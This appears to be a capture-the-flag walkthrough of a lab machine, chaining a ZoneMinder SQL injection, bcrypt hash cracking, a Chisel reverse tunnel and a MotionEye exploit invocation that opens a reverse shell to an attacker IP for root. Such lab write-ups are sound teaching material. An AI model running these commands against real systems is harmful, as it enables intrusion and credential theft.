## 1. Initial Access

In the beginning, I scanned the target and found **SSH** and **HTTP** ports are open. Let’s check the HTTP web server. It gave me a CCTV interface running **ZoneMinder**.

I started searching for a CVE and I found that this version of ZoneMinder is vulnerable to:

### **CVE-2024-51482**

I used this POC to understand the vulnerability: [ZoneMinder Security Advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)

### Database Enumeration

After exploiting it, I was able to see the available databases [3]:

- `information_schema`
    
- `performance_schema`
    
- `zm`
    

I decided to collect the tables from the **`zm`** database to see what we have:

> Snapshots_Events, Maps, Events_Week, Object_Types, Models, MontageLayouts, Monitor_Status, Event_Data, States, TriggersX10, Storage, Logs, Snapshots, Reports, Groups, Tags, ControlPresets, **Users**, Events_Month, Groups_Permissions, Server_Stats, Filters, Frames, Events_Day, Groups_Monitors, Monitors, Zones, Stats, Devices, User_Preferences, Monitors_Permissions, Config, Sessions, Events_Archived, Controls, ZonePresets, MonitorPresets, Events, Manufacturers, Event_Summaries, Servers, Events_Tags, Events_Hour.

### Cracking Passwords

Now, let’s try getting passwords from the `zm.Users` table:

|username|password|
|---|---|
|**superadmin**|`$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm`|
|**mark**|`$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`|
|**admin**|`$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m`|


I took the hash of the user **mark** and tried to crack it using **John the Ripper**:

Bash

```
john hash.txt --wordlist='/home/youssef/Downloads/wordlists/rockyou.txt'
```

**Cracked:** `opensesame`

---

## 2. Privilege Escalation (PrivESC)

I logged in as `mark` via SSH, but I found no `user.txt`, no SUID files, and no interesting processes running. So, I tried to see the open ports on this machine internally:

Bash

```
ss -tunlp
```

The output showed a lot of ports running on `localhost`:

- `127.0.0.1:8765`
    
- `127.0.0.1:8888`
    
- `127.0.0.1:1935`
    
- `127.0.0.1:3306` (MySQL)
    
- ...and others.
    

### Pivoting to Local Network

Since there are many ports running on the localhost, we need to tunnel the network to our device to access these ports. I used **Chisel** for this. I also found this helpful blog for reference: [Tunneling with Chisel](https://0xdf.gitlab.io/cheatsheets/chisel)

**On my Attack Box:**


```bash
./chisel server -p 8000 --reverse
```

**On the Target Box:**


```bash
./chisel client 10.10.16.44:8000 R:8765:127.0.0.1:8765
```

---

## 3. Exploiting MotionEye

I tried to port forward the local ports, and the one that worked on HTTP was port **8765**. This server uses a technology called **MotionEye**. I searched for a CVE and found:

### **CVE-2025-60787**

I found a PoC here: [GitHub - CVE-2025-60787](https://github.com/gunzf0x/CVE-2025-60787)

**My attempts:**

1. I first tried the exploit with an anonymous session (username: "", password: ""), but it was unauthorized.
    
2. I tried logging in with `{admin:admin}` and `{mark:opensesame}`, but nothing was valid.
    

Since no credentials worked, I went back to the SSH session for more enumeration:

Bash

```
find / -name motioneye 2>/dev/null
```

After some enumeration, I finally found the credentials for the admin in `/etc/motioneye/motion.conf`:


```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
```

### Getting Root

Now we can trigger the CVE using the credentials we found:


```bash
python3 CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i 10.10.16.44 --port 4444
```

**Boom!** We are not just a user; we are **root**! Enjoy capturing the flags now.